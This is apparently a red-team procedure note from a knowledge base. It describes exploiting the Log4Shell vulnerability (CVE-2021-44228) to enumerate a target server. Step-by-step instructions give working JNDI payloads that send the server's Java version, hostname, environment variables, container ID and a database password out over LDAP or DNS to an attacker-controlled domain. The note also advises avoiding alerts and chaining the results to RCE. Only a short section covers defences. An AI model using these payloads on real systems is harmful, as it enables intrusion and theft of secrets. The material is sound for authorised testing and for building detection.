---
type: procedure
description: >-
  This procedure uses Log4Shell vulnerability to enumerate system information
  like Java version and hostname via JNDI lookups.
verified: true
submitted: false
tactics:
  - '[[Execution]]'
  - '[[Discovery]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[System Information Discovery]]'
sub_techniques: []
tags:
  - cve-2021-44228
  - log4shell
  - rce
  - enumeration
  - jndi
commands:
  - '[[commands/log4shell-jndi-lookup-java-version-hostname]]'
  - '[[commands/log4shell-jndi-lookup-environment-variables]]'
platforms:
  - Java
  - Linux
  - Windows
  - Web
tools: []
validated: true
---

# Enumerate-Information-via-Log4Shell-JNDI-Lookups

## Summary

This procedure exploits the CVE-2021-44228 Log4Shell vulnerability in Apache Log4j to perform information enumeration on a vulnerable server. By injecting specially crafted JNDI lookup strings into application inputs that trigger Log4j message processing, an attacker can force the server to resolve and leak sensitive details such as the Java version, hostname, operating system, and potentially database credentials or container IDs. This is useful for reconnaissance in a targeted attack, allowing further customization of exploits based on the discovered environment.

## Description

Log4Shell (CVE-2021-44228) affects Log4j versions 2.0-beta9 through 2.14.1, where user-controlled input is processed via the JNDI (Java Naming and Directory Interface) lookup feature, enabling remote code execution or data exfiltration. In this enumeration-focused procedure, we leverage JNDI to query Java system properties, environment variables, and host details without full RCE, though it relies on the same vulnerable lookup mechanism. The target is typically a web application (e.g., using Log4j for logging user inputs like usernames or search queries) exposed over HTTP/HTTPS. Success depends on the application's configuration allowing LDAP or DNS resolution to attacker-controlled servers, but here we focus on direct property extraction via dotted notation. This technique maps to MITRE ATT&CK as exploitation of public-facing applications for system discovery, providing foundational intel for lateral movement or privilege escalation.

## Requirements

1. Network access to a vulnerable Log4j-enabled application (e.g., via HTTP POST/GET parameters that log input).
2. Knowledge of an input vector that triggers JNDI lookup (e.g., username field, search box).
3. Attacker-controlled DNS or LDAP server to capture resolutions (optional for basic property leaks).
4. Tools like Burp Suite or curl for injecting payloads into requests.

## Defense

- Immediately patch Log4j to version 2.17.0 or later, or apply mitigations like setting log4j2.formatMsgNoLookups=true.
- Implement web application firewall (WAF) rules to block JNDI payloads containing ${jndi:...
- Monitor logs and network traffic for anomalous LDAP/DNS queries from internal systems.
- Use runtime application self-protection (RASP) to detect and block deserialization attempts.

## Objectives

1. Extract Java runtime details (version, vendor) to assess exploit compatibility.
2. Retrieve hostname and basic system properties for environment fingerprinting.
3. Enumerate additional variables like OS, container IDs, or config values for deeper reconnaissance.
4. Validate vulnerability presence without causing disruption.

## Instructions

### Step 1: Identify Vulnerable Input and Inject Basic JNDI Payloads for Java and Host Enumeration

**Context**: Begin by targeting inputs that process Log4j messages. Use payloads that resolve Java properties and hostname directly. These will cause the server to append the resolved values to DNS/LDAP queries if configured, or leak via error messages/response headers. Replace 'domain' with your controlled DNS domain to observe resolutions.

**Command** ([[commands/log4shell-jndi-lookup-java-version-hostname]]):
```bash
${jndi:ldap://${java:version}.domain/a}
${jndi:ldap://${env:JAVA_VERSION}.domain/a}
${jndi:ldap://${sys:java.version}.domain/a}
${jndi:ldap://${sys:java.vendor}.domain/a}
${jndi:ldap://${hostName}.domain/a}
${jndi:dns://${hostName}.domain}
```

> Inject one payload at a time into the vulnerable field (e.g., via curl POST). Monitor your DNS/LDAP server for incoming queries containing the leaked values, such as '1.8.0_292.example.com' for Java version. If no resolver, check application responses for errors exposing the properties. This step confirms the vulnerability and gathers core runtime info.

### Step 2: Extend Enumeration to Environment and Configuration Variables

**Context**: Using the format from Step 1, substitute additional Java properties to probe deeper system details. These keywords target OS info, container environments, web app paths, and sensitive configs. This helps map the target's deployment (e.g., Docker, Tomcat) for tailored follow-on attacks.

**Command** ([[commands/log4shell-jndi-lookup-environment-variables]]):
```bash
java:os
java:os:version
docker:containerId
web:rootDir
web:server
bundle:config:db.password
```

> Construct full payloads like '${jndi:ldap://${java:os}.domain/a}' and inject similarly. Expected resolutions might include 'Linux' or '/usr/local/tomcat/webapps'. If database creds leak, avoid further injection to prevent alerts. Verify by cross-referencing with known Log4j property lists; unsuccessful lookups indicate restricted properties or patched mitigations.

### Step 3: Validate and Document Leaked Information

**Context**: After injection, compile the resolved values. If no leaks occur, test alternative protocols (RMI instead of LDAP) or confirm vulnerability with a benign payload like '${jndi:ldap://test.domain/a}'. This ensures the enumeration is reliable before chaining to RCE.

No specific command; use output from prior steps to log findings (e.g., in a notes file). Expected: A profile of the target's Java env, useful for selecting compatible exploits.
